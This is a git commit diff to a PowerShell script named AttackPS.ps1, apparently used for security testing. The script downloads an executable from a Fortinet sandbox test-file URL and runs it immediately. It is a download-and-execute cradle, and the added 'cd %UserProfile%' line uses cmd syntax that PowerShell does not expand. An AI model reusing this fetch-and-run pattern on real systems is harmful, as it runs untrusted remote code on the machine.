39235328738d822d3bb70bea8c11aef00ed299e3
Alberto <alberto.briano@outlook.com>
2026-06-15 22:47:55 +0200

    trying to move to another directory to run the file

--- Windows/AttackPS.ps1
+++ Windows/AttackPS.ps1
@@ -1,7 +1,7 @@
+cd %UserProfile%
 $down = New-Object System.Net.WebClient
 $url = 'https://filegen.fortinet.com/v1/sandbox-file?file_name=windows.exe';
 $file = 'windows.exe';
 $down.DownloadFile($url,$file);
-Start-Sleep -Seconds 1
 $exec = New-Object -com shell.application
 $exec.shellexecute($file);
